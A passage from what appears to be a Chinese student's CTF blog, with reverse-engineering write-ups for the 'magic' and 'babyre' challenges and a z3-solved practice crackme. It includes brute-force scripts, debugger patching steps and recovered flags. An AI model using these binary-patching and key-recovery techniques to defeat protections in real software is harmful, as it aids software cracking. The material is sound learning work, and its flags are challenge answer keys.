步进以后是各种系统函数的开头ntdll.xxxxxxx开头的各种调用，开始慌了，但是这些应该都是系统调用，主要看的应该是magic.xxxxx这样的才对 然后就每个magic开头的调用都用ida找到对应的地址，分析一波函数，耗费无数时间和头发以后，终于来到一个奇妙的函数sub_402563，用ida看这个函数是这样子的： 这个看起来就很棒啊，然而看着一地的头发，我不禁陷入沉思：为什么不一开始就搜索字符串。。。 然后看这判断，一看就可以写脚本跑啊，然后 呵呵，摔(╯‵□′)╯︵┻━┻ 对不起我这一地头发！！！ 算了继续。 然后就接着单步，在wp的提醒下(羞愧，捂脸)，我学会了一边看控制台一边单步，来找到关键函数。。。（我还是太菜了 通过单步发现这个call输出了结果，最终结果是magic.402218输出的，但是ida分析后发现这个函数没有判断，然后就往上找可以找到magic.402268，然后ida打开，这就找到了判断时间的关键函数 很明显，byte_405020是密钥，通过与正确的时间作为种子所生成的随机数异或，然后调用另外一个函数sub_4027ED 仔细看可以看出来，Dst是个结构体，大小为12byte，是个有256个结构体的结构体数组，结构体大概长这样 12345struct Dst&#123; BYTE ch; DWORD mem1; DWORD mem2;&#125;; //由于对齐的原因，ch后补了3个空字节，DWORD占4个字节，所以总共是12个字节 对于每个结构体，ch被赋值为相应的异或后的结果，mem1赋值为0x7FFFFFFF，mem2赋值为0，然后就进入下个函数 还可以通过查看栈的位置，发现v2和v1其实分别是Dst[255]的mem1和mem2的值 sub_4026D0就是个对结构体的处理函数，于是就可以总结一哈： 时间在 0x5AFFE78F~0x5B028A8F 之间，并作为随机数种子 通过与一个字符数组的序列进行异或，生成一个结构体数组 结构体数组进行操作，可以得到v1、v2的值 v2的值实际上是Dst[255].mem1，并且应该等于0x700 于是，有了这些，就可以愉快的写脚本爆破了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;iomanip&gt;using namespace std;typedef unsigned char sngl;struct Ele&#123; char byte; //由于最开始写的时候把byte的类型设置为unsigned char int mem1; //硬是跑出包含正确种子在内的21个种子。。。 int mem2; //无法接受.jpg&#125;;sngl aim_table[]=&#123;0x58,0x71,0x8F,0x32,0x05,0x06,0x51,0xC7,0xA7,0xF8,0x3A,0xE1,0x06,0x48,0x82,0x09,0xA1,0x12,0x9F,0x7C,0xB8,0x2A,0x6F,0x95,0xFD,0xD0,0x67,0xC8,0xE3,0xCE,0xAB,0x12,0x1F,0x98,0x6B,0x14,0xEA,0x89,0x90,0x21,0x2D,0xFD,0x9A,0xBB,0x47,0xCC,0xEA,0x9C,0xD7,0x50,0x27,0xAF,0xB9,0x77,0xDF,0xC5,0xE9,0xE1,0x50,0xD3,0x38,0x89,0xEF,0x2D,0x72,0xC2,0xDF,0xF3,0x7D,0x7D,0x65,0x95,0xED,0x13,0x00,0x1C,0xA3,0x3C,0xE3,0x57,0xE3,0xF7,0xF7,0x2C,0x73,0x88,0x34,0xB1,0x62,0xD3,0x37,0x19,0x26,0xBE,0xB2,0x33,0x20,0x3F,0x60,0x39,0x87,0xA6,0x65,0xAD,0x73,0x1A,0x6D,0x49,0x33,0x49,0xC0,0x56,0x00,0xBE,0x0A,0xCF,0x28,0x7E,0x8E,0x69,0x87,0xE1,0x05,0x88,0xDA,0x54,0x3E,0x3C,0x0E,0xA9,0xFA,0xD7,0x7F,0x4E,0x44,0xC6,0x9A,0x0A,0xD2,0x98,0x6A,0xA4,0x19,0x6D,0x8C,0xE1,0xF9,0x30,0xE5,0xFF,0x33,0x4A,0xA9,0x52,0x3A,0x0D,0x67,0x20,0x1D,0xBF,0x36,0x3E,0xE8,0x56,0xBF,0x5A,0x88,0xA8,0x69,0xD6,0xAB,0x52,0xF1,0x14,0xF2,0xD7,0xEF,0x92,0xF7,0xA0,0x70,0xA1,0xEF,0xE3,0x1F,0x66,0x2B,0x97,0xF6,0x2B,0x30,0x0F,0xB0,0xB4,0xC0,0xFE,0xA6,0x62,0xFD,0xE6,0x4C,0x39,0xCF,0x20,0xB3,0x10,0x60,0x9F,0x34,0xBE,0xB2,0x1C,0x3B,0x6B,0x1D,0xDF,0x53,0x72,0xF2,0xFA,0xB1,0x51,0x82,0x04,0x30,0x56,0x1F,0x37,0x72,0x7A,0x97,0x50,0x29,0x86,0x4A,0x09,0x3C,0x59,0xC4,0x41,0x71,0xF8,0x1A,0xD2,0x30,0x88,0x63,0xFF,0x85,0xDE,0x24,0x8C,0xC3,0x37,0x14,0xC7&#125;;Ele *check(Ele *_struct,int index)&#123; Ele *result = NULL; if(index &gt;= 0 &amp;&amp; index &lt;= 255) result = &amp;_struct[index]; else memset(result, 0 ,sizeof(result)); return result;&#125;void work(Ele *dst,int idx)&#123; Ele *result = NULL; Ele *v3 = NULL; int v4; Ele *v5 = NULL; Ele *v6 = NULL; Ele *v7 = NULL; Ele *v8 = NULL; unsigned int index; v8 = dst; index = idx; result = check(v8,idx); v7 = result; if(result) &#123; if(index &amp; 0xF) v3 = check(v8,index-0x1); else v3 = 0x0; v6 = v3; if(index + 0xF &lt;= 0x1E) result = 0x0; else result = check(v8,index - 0x10); v5 = result; if(v6 || result) &#123; if(v6) &#123; v7-&gt;mem1 = v7-&gt;byte + v6-&gt;mem1; result = v7; v7-&gt;mem2 = 2 * v6-&gt;mem2; &#125; if(v5) &#123; v4 = v5-&gt;mem1 + v7-&gt;byte; if(v4 &lt; v7-&gt;mem1) &#123; v7-&gt;mem1 = v4; result = v7; v7-&gt;mem2 = 2 * v5-&gt;mem2 | 1; &#125; &#125; &#125; else &#123; result = v7; v7-&gt;mem1 = v7-&gt;byte; &#125; &#125; return;&#125;bool calculate(sngl str[])&#123; Ele *Dst; Dst = (Ele *)malloc(sizeof(Ele)*0x100); memset(Dst,0,0xC00); for(int i = 0;i &lt;= 255 ; i++) &#123; Dst[i].byte = str[i]; Dst[i].mem1 = 0x7FFFFFFF; Dst[i].mem2 = 0; work(Dst,i); &#125; if(Dst[255].mem1 == 0x700) return true; else return false; &#125;int main()&#123; unsigned int time; int cas = 0; for(time = 0x5AFFE790 ; time &lt; 0x5B028A8F ; time ++) &#123; srand(time); sngl table[256]; memcpy(table,aim_table,256); for(int i = 0 ; i &lt;= 255 ; i++) &#123; table[i] ^= rand(); &#125; if(calculate(table)) &#123; printf(\"0x%x\",time); break; &#125; &#125; return 0;&#125; //可以得到时间是0x5B00E398 然后就在magic._time64调用完后修改返回值 然后就单步，会找到一个需要输入的函数sub_4023B1，这里用到了回调的机制，真是打开了新世界的大门 依旧ida打开 可以看到输入是26个字符，然后对输入进行加密（我修改过函数名）然后一个判断，通过了以后再对加密串进行加密（可以猜测加密是异或之类的可以两次加密复原的那种），然后分析encode，发现确实是通过异或加密的。 然后再看sub_4029C7这个判断函数（只截了一部分） 看起来贼复杂（其实做起来也很复杂。。。啊我的头发 这里用到了setjmp和longjmp，大致上算是goto的升级版 其实相当于汇编机器码一样的，ins_table里存的就相当于指令，根据指令一个个进行操作，简化以后是这样 12345unsigned char arg = 0x66;ch += 0xCC;ch &amp;= 0xFF;ch ^= arg;arg = ~ arg; 由于密文也已经知道（key_word)就可以进行爆破正确的加密后的密文了（正确的输入没必要跑，因为可以通过程序自动第二次加密得到:P 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;using namespace std;int keyboard[]=&#123;0x89 ,0xC1 ,0xEC ,0x50 ,0x97 ,0x3A ,0x57 ,0x59 ,0xE4 ,0xE6 ,0xE4 ,0x42 ,0xCB,0xD9 ,0x08 ,0x22 ,0xAE ,0x9D ,0x7C ,0x07 ,0x80 ,0x8F ,0x1B ,0x45 ,0x04 ,0xE8&#125;;int main()&#123; char ans[26]; int arg[2] = &#123;0x66,0x99&#125;; for(int i = 0 ;i &lt; 26 ; i++) &#123; int j; int ch; for(j = 0x00;j &lt; 0xFF ; j++) &#123; ch = j; ch += 0xCC; ch &amp;= 0xFF; ch ^= arg[i%2]; if(ch == keyboard[i]) &#123; printf(\"%02x\",j); break; &#125; &#125; &#125; return 0; //238cbefd25d765f4b6b3b60fe174a2effc384ed21a4ab11096a5 &#125; 然后就在第一次加密后，将对应的内存修改为得到的字串 然后这时候就有神秘的情况出现，这是错误输入没有的 通过对比和分析机器码可以猜测，这个操作不重要，于是可以把出现除0的地方改成除1，由于除数也是机器码里的，所以直接通过修改内存就可以 然后继续步过，当再次通过加密函数的时候，可以看见内存里之前修改的部分已经变成了一半的flag。。。 然后注意控制台黑框框，继续步过 然后就能得到完整的输出 可以得到完整的flag是rctf{h@ck_For_fun_02508iO2_2iOR} 前面一部分可以通过眯眼看出来23333，像我就不一样，我取下眼镜就能直接看出来2333333 要不比划一下？ 收获这次的题目，我学到了挺多东西的，或许说是更熟练了（白学家gunna 对x64dbg这个工具用的更熟练了，毕竟调了快20个小时233333发现了之前没有用到过的操作 碰到了回调函数，知道了这种机制，以后碰到就有了方向 感受到了windows下逆向的便捷，x86dbg和ida一起用起来如有神助（然而这和我是个菜鸡有什么关系呢.jpg 学到了setjmp()和longjmp()的操作 看到了结构体在内存中的存储方式 又一次分析了模拟计算机机器码的操作，下次碰到争取不慌XD","path":"2018/07/29/magic/","date":"07-29","excerpt":"这个题调得有点久23333 但是收获很大0v0"},{"title":"babyre","text":"又开始口胡了 这个题是18年SUCTF的题，我当时当然一下子就看出来放弃了，毕竟那时候比现在还要菜(现在也很菜就是了)。。。 题目在这 看题题目说的是现有一个加密后的密文和加密程序，需要得到明文 这次会长抛给这道题的时候我以为是那种把加密过程逆一下的那种加密（之前做过逆加密的题），然后看那段加密看了很久，很久，很久，妈耶完全做不出来好嘛(ノ=Д=)ノ┻━┻ 然后，会长说这不是逆加密，用爆破就好了。。。 然后，好的，我这就去试试。。。 一顿分析打开ida，熟练地按下F5 虽说之前逆加密过程的想法是错的，但至少得到了点东西，比如 这么多函数连同srand在内只有operate有用。。。看了挺久才发现233333 进入operate函数就能看到我们的加密函数了，进去看看就会发现 它是单字节加密的，所以就可以爆破，四个字节以内的都能爆破。 脚本我把out里的密文按照unsigned int 的大小分开了 12345678910111213141516171819202122232425262728293031323334353637unsigned int num[]=&#123; 0xB80C91FE,0x70573EFE,0xBEED92AE,0x7F7A8193, 0x7390C17B,0x90347C6C,0xAA7A15DF,0xAA7A15DF, 0x526BA076,0x153F1A32,0x545C15AD,0x7D8AA463, 0x526BA076,0xFBCB7AA0,0x7D8AA463,0x9C513266, 0x526BA076,0x6D7DF3E1,0xAA7A15DF,0x9C513266, 0x1EDC3864,0x9323BC07,0x7D8AA463,0xFBCB7AA0, 0x153F1A32,0x526BA076,0xF5650025,0xAA7A15DF, 0x1EDC3864,0xB13AD888,0&#125;; unsigned __int64 constant = 0x1D082C23A72BE4C1;unsigned __int64 v5;unsigned int res;for(unsigned int i=0;num[i]!=0;i++)&#123; int ans; for(ans=0x20;ans&lt;0x7f;ans++) &#123; res = ans; for(unsigned int j=0;j&lt;=0x20f;++j) &#123; v5 = constant &gt;&gt; (j &amp; 0x1f); if(j &amp; 0x20) LODWORD(v5) = HIDWORD(v5); res = (res &gt;&gt; 1) ^ (((unsigned int)v5 ^ res ^ (res &gt;&gt; 16) ^ (1551120942 &gt;&gt; (((res &gt;&gt; 1) &amp; 1) + 2 * (2 * (((v9 &gt;&gt; 20) &amp; 1) + 2 * (2 * (v9 &gt;&gt; 31) + ((v9 &gt;&gt; 26) &amp; 1))) + ((v9 &gt;&gt; 9) &amp; 1))))) &lt;&lt; 31); &#125; if(res == num[i]) &#123; printf(\"%c\",ans); //跑完flag就出来了 break; &#125; &#125;&#125; 另外一个石乐志的做法我开始写脚本的时候，把ans循环里0x7F中把F看成跟L这类符号一样的符号了，本着化简的想法（然而我下面一行的0x1F却完全没有化简的想法），就把F删了。。。删了。。。删了。。。正当我看着跑出来的乱码迷得一比的时候，我发现，我可以把ASCII码表加密一遍啊！卧槽，我真机(shi)智！ 由之前的分析，进入加密函数之前有两次输入，第一次是输入任意字符串，第二次输入一个数seed，必须满足9&lt;n&lt;=32。然后每次只能加密30个字符。 然后就开始了快(you)乐(du)的加密，把ASCII码表从0x21开始到0x7F的可打印字符加密出来，然后一个个和密文比对，也能得出flag。 123456for(int i=0;num[i]!=0;i++) &#123; for(int j=0;j&lt;95;j++) //num储存ASCII可打印字符加密结果 if(num[i] == ans[j]) //ans储存密文 printf(\"%c\",j+33); //ASCII可打印字符（不算空格，空格是0x20)从0x21（33）开始， &#125; 总结这个题，貌似是签到题，所以并不是很复杂，我找对方向以后也就用了一个晚上的时间(当然，没找对方向的时候用了几天。。。也没做出来) 果然，reverse的题花样还是很多的，而且一道题说不定有比较简单的方式，比如这道题可以啥也不管直接加密ASCII码表然后对比2333333，当然这是事后才知道哈哈哈","path":"2018/07/09/babyre/","date":"07-09","excerpt":"又开始口胡了"},{"title":"Reverse","text":"本辣鸡要开始口胡了 前几天会长发了道练习题，本萌新尝试着做了一下，然后 第一次完全自己做出题真tm开心 题目在这 随便看看在Ubuntu里file得知是64位的文件 运行下试试 看起来就是要找到密码 废话！ 一顿分析用IDA打开 发现 密码长度为32个字符串 每4位组合成一个int类型的值 判断总共是8个方程 前四个int类型的数异或以后当成rand的种子 工具 python的z3-solver库，linux下的 脚本 前四位（a,b,c,d) 12345678910#!/usr/bin/env pythonfrom z3 import *a = Int('a')b = Int('b')c = Int('c')d = Int('d')solve(b*a-c*d == 0x24CDF2E7C953DA56, 3*c+4*d-b-2*a == 0x17B85F06, 3*a*d-c*b == 0x2E6E497E6415CF3E, 27*b+a-11*d-c == 0x95AE13337) ​ 解出来就得到密码前16位 后四位（e,f,g,h） 按照只要种子一样，得到的随机数数列也是相同的，所以很容易得到它的那些参数，但是这里我踩了个坑 这里随机数要用gdb单步出来 我开始没在Ubuntu里，在Windows下用C语言写的，然后得到的参数根本解不出来。。。 只要把前十六位解出来转换成字符串，再加上16位任意字符，凑成32位的密码，关注得到随机参数时eax的值，记录下来就是了，顺便还能检查一下前十六位有没有解错（解错会有跳转 至于为什么，其实我也不知道大概是因为系统不同吧 12345678910#!/usr/bin/env pythonfrom z3 import *e = Int('e')f = Int('f')g = Int('g')h = Int('h')solve(h*0x27+e*0x16-f-g == 0xE638C96D3, h+e+g*0x2d-f*0x2d == 0xB59F2D0CB, e*0x23+f*0x29-g-h == 0xDCFE88C6D, g*0x24+e-f-h*0xd == 0xC076D98BB) ​ 同样，跑出来就是密码后16位 密码 将32位都跑出来以后，直接转换成字符串，就能得到密码 12345int i;int sum[32]=&#123;0x61,0x6D,0x70,0x6F,0x5A,0x32,0x5A,0x6B,0x4E,0x6E,0x6B,0x31,0x4E,0x48,0x6C,0x33, 0x4E,0x54,0x63,0x30,0x4E,0x54,0x63,0x31,0x5A,0x33,0x4E,0x6F,0x61,0x47,0x46,0x47&#125;;for(i=0;i&lt;32;i++) printf(\"%c\",sum[i]); 结果然后就是激动人心的得到falg的过程了 看来没错了 总结​ 这个题讲真，虽然是很简单的那种题毕竟连我都会，但是那种激动的感觉真的没法用言语说明，就像发现新大陆的感觉，也可能是那种学了这么久能独立写出题的快乐吧","path":"2018/07/09/Reverse/","date":"07-09","excerpt":"本辣鸡要开始口胡了 前几天会长发了道练习题，本萌新尝试着做了一下，然后 第一次完全自己做出题真tm开心"},{"title":"Hello World","text":"ctf萌新报道！ 开这个blog是为了记录我写不出来和没过的题，顺便写点总结啥的 十分感谢 codgician 大佬的无私帮助，才能顺利搭好这个blog~ %%%%%%% 就跟每个语言的初学者的第一份代码一样 Hello World！Hello world~","path":"2018/07/08/hello-world/","date":"07-08","excerpt":"ctf萌新报道！ 开这个blog是为了记录我写不出来和没过的题，顺便写点总结啥的"}]}